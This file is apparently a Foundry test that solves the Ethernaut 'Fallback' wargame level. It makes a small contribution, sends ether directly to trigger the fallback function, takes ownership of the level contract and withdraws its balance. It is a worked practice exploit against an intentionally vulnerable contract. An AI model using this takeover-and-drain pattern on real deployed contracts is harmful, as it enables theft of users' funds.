pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/Fallback/FallbackFactory.sol";
import "../src/core//Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);

        console.log("eoaAddress = %s", eoaAddress);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        ethernautFallback.contribute{value: 0.0009 ether}();
        uint contribution = ethernautFallback.getContribution();
        console.log("Contribution %s", contribution);

        address owner = ethernautFallback.owner();  
        console.log("Owner = %s", owner);

        (bool success, ) = payable(address(ethernautFallback)).call{value: 1, gas: 50000}("");
        assert(success);    

        owner = ethernautFallback.owner();  
        console.log("Owner = %s", owner);

        ethernautFallback.withdraw();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
